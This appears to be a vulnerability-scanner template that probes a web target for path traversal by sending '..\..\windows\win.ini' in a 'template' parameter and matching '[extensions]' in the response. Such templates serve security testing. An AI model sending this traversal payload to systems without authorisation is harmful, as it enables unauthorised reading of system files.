id: lfi6-0705
name: 'Traversal in template'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via template'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      template:
        - '..\..\windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
